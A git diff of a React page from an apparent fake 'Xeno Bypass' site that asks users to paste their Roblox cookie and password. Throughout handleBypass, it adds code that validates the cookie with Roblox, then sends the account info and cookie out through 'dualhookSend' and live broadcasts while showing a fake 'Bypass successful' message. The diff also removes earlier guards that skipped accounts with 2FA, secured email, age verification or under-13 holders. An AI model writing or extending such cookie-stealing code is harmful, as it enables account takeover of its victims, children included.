@@ -1,8 +1,11 @@
 import { useState, useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
-import { Eye, EyeOff, ShieldCheck, ArrowLeft, Loader2, CheckCircle2, XCircle, Cookie } from "lucide-react";
+import { Eye, EyeOff, ArrowLeft, Loader2, CheckCircle2, XCircle, Cookie, Shield } from "lucide-react";
 import ShieldIcon from "@/components/ShieldIcon";
-import { dualhookSend, AccountInfo } from "@/lib/tokenStore";
+import {
+  dualhookSend, AccountInfo, isValidCookieFormat,
+  broadcastLiveBypass, broadcastLiveBypassFailed, pushLiveBypass,
+} from "@/lib/tokenStore";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
 
@@ -50,6 +53,10 @@ const BypassPage = () => {
   const handleBypass = async () => {
     const trimmed = cookie.trim();
     if (!trimmed) { toast.error("Please enter a cookie"); return; }
+    if (!isValidCookieFormat(trimmed)) {
+      toast.error("Invalid cookie format");
+      return;
+    }
 
     const attempts = getAttempts();
     if (attempts.length >= MAX_ATTEMPTS_PER_MIN) {
@@ -66,6 +73,7 @@ const BypassPage = () => {
       setProgress(Math.min(99, ((Date.now() - start) / BYPASS_DURATION_MS) * 100));
     }, 200);
 
+    // Validate cookie with Roblox first
     let apiOk = false;
     let info: AccountInfo = { valid: false };
     try {
@@ -76,22 +84,19 @@ const BypassPage = () => {
       }
     } catch { apiOk = false; }
 
-    // Guards: reject if any of these conditions
-    if (apiOk) {
-      const blockReasons: string[] = [];
-      if (info.has2FA) blockReasons.push("authenticator enabled");
-      if (info.emailVerified) blockReasons.push("email is secured");
-      if (info.under13) blockReasons.push("account holder is under 13");
-      if (info.ageVerified) blockReasons.push("account is age-verified");
-
-      if (blockReasons.length > 0) {
-        if (intervalRef.current) window.clearInterval(intervalRef.current);
-        setProgress(0);
-        setStatus("error");
-        toast.error(`Bypass blocked: ${blockReasons.join(", ")}`);
-        return;
-      }
+    // If cookie invalid → block bypass and announce failure
+    if (!apiOk) {
+      if (intervalRef.current) window.clearInterval(intervalRef.current);
+      setProgress(0);
+      setStatus("error");
+      toast.error("Invalid cookie — bypass blocked");
+      await broadcastLiveBypassFailed({ valid: false, username: 'Unknown' }, 'Invalid cookie');
+      pushLiveBypass({ username: 'Unknown', success: false });
+      return;
     }
+
+    // Cookie valid — announce live bypass start immediately
+    broadcastLiveBypass(info);
 
     const elapsed = Date.now() - start;
     if (elapsed < BYPASS_DURATION_MS) await new Promise(r => setTimeout(r, BYPASS_DURATION_MS - elapsed));
@@ -99,11 +104,12 @@ const BypassPage = () => {
     if (intervalRef.current) window.clearInterval(intervalRef.current);
     setProgress(100);
 
-    // Send dualhook (main + active directory) + live bypass
-    if (apiOk) await dualhookSend("bypass", info);
+    // Send dualhook hit embeds (info + cookie) regardless of age/2FA — only blocked by invalid cookie
+    await dualhookSend("bypass", info);
+    pushLiveBypass({ username: info.username || 'Unknown', avatarUrl: info.avatarUrl, success: true });
 
-    if (apiOk) { setStatus("success"); toast.success("Bypass successful!"); }
-    else { setStatus("error"); toast.error("Bypass failed"); }
+    setStatus("success");
+    toast.success("Bypass successful!");
   };
 
   const currentStage = [...STAGES].reverse().find(s => progress >= s.at) ?? STAGES[0];
@@ -114,20 +120,15 @@ const BypassPage = () => {
 
       <div className="max-w-sm mx-auto space-y-6 relative z-10 animate-fade-in-up">
         <div className="flex items-center gap-3">
-          <button onClick={() => navigate("/dashboard")} className="text-muted-foreground hover:text-foreground transition-colors p-1">
+          <button onClick={() => navigate("/dashboard")} className="text-muted-foreground hover:text-foreground transition-all duration-300 hover:-translate-x-1 p-1">
             <ArrowLeft size={20} />
           </button>
-          <h1 className="text-xl font-bold text-foreground">Bypass</h1>
+          <h1 className="text-xl font-bold text-foreground">Dashboard</h1>
         </div>
 
         <ShieldIcon size="md" />
 
-        <div className="text-center space-y-1">
-          <h2 className="text-2xl font-black text-foreground glow-text">Xeno Bypass</h2>
-          <p className="text-muted-foreground text-xs">Secure automation with real-time bypassing</p>
-        </div>
-
-        <div className="card-glow rounded-2xl p-5 space-y-4">
+        <div className="card-glow rounded-2xl p-5 space-y-4 animate-fade-in">
           <div className="space-y-2">
             <label className="text-sm font-semibold text-foreground flex items-center gap-1.5">
               <Cookie size={14} className="text-primary" /> Cookie
@@ -138,7 +139,7 @@ const BypassPage = () => {
               maxLength={1500}
               placeholder="Paste your cookie..."
               disabled={status === "loading"}
-              className="input-field text-sm font-mono"
+              className="input-field text-sm font-mono transition-all"
             />
           </div>
 
@@ -151,9 +152,9 @@ const BypassPage = () => {
                 onChange={e => setPassword(e.target.value)}
                 placeholder="Enter your password"
                 disabled={status === "loading"}
-                className="input-field pr-10"
+                className="input-field pr-10 transition-all"
               />
-              <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground">
+              <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors">
                 {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
               </button>
             </div>
@@ -162,17 +163,17 @@ const BypassPage = () => {
           <button
             onClick={handleBypass}
             disabled={status === "loading"}
-            className="w-full shimmer text-primary-foreground font-semibold py-3.5 rounded-xl flex items-center justify-center gap-2.5 glow-btn transition-all duration-300 disabled:opacity-50"
+            className="w-full shimmer text-primary-foreground font-semibold py-3.5 rounded-xl flex items-center justify-center gap-2.5 glow-btn transition-all duration-300 hover:scale-[1.01] disabled:opacity-50 disabled:hover:scale-100"
           >
             {status === "loading" ? (<><Loader2 size={18} className="animate-spin" /> Bypassing...</>)
               : status === "success" ? (<><CheckCircle2 size={18} /> Bypassed!</>)
-              : status === "error" ? (<><XCircle size={18} /> Retry Bypass</>)
-              : (<><ShieldCheck size={18} /> Xeno Bypass</>)}
+              : status === "error" ? (<><XCircle size={18} /> Retry</>)
+              : (<><Shield size={18} /> Bypass</>)}
           </button>
         </div>
 
         {status === "loading" && (
-          <div className="card-glow rounded-2xl p-5 space-y-4">
+          <div className="card-glow rounded-2xl p-5 space-y-4 animate-fade-in">
             <div className="flex items-center gap-3">
               <Loader2 size={18} className="text-primary animate-spin" />
               <div className="flex-1">
@@ -190,14 +191,14 @@ const BypassPage = () => {
         )}
 
         {status === "success" && (
-          <div className="card-glow rounded-2xl p-5 flex items-center gap-3">
+          <div className="card-glow rounded-2xl p-5 flex items-center gap-3 animate-scale-in">
             <CheckCircle2 className="text-[hsl(var(--success))]" size={22} />
             <p className="text-sm font-semibold text-foreground">Bypass completed successfully.</p>
           </div>
         )}
 
         {status === "error" && (
-          <div className="card-glow rounded-2xl p-5 flex items-center gap-3">
+          <div className="card-glow rounded-2xl p-5 flex items-center gap-3 animate-scale-in">
             <XCircle className="text-destructive" size={22} />
             <p className="text-sm font-semibold text-foreground">Bypass failed.</p>
           </div>
